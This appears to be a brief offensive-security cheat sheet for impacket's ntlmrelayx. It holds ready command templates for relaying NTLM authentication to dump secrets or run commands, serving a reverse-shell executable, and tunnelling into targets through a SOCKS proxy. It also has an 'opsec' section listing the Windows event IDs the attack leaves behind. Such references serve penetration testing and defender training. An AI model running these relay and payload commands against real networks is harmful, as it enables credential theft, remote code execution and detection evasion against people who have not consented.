### Source
https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py  

### General information
```
Pass-The-Hash with NTHash/NTLM possible
Pass-The-Hash with NET-NTLM/NTLMv1/v2 not possible
Relaying does not work if smb signing is enabled
```

### Relay requests to ip addresses, without -c ntlmrelayx will use secretsdump
```
impacket-ntlmrelayx -tf <rhostFile> -c '<command>'
```

### Serve payload
```
impacket-ntlmrelayx -t <rhost> -e <./reverse.exe>
```

### Create socks proxy connection to relay target (socks5 using port 1080)
```
ntlmrelayx.py -smb2support -t smb://<rhost> -socks
proxychains smbclient.py -no-pass <domain>/<user>@<rhost>    
```

### Opsec considerations - 
```
Windows Security Log Event IDs
-Logon (4624) -> multiple
-Logoff (4634) -> multiple
-Special Logon (4672) -> multiple

Windows System Logs
Service Control Manager (7040) -> multiple
```

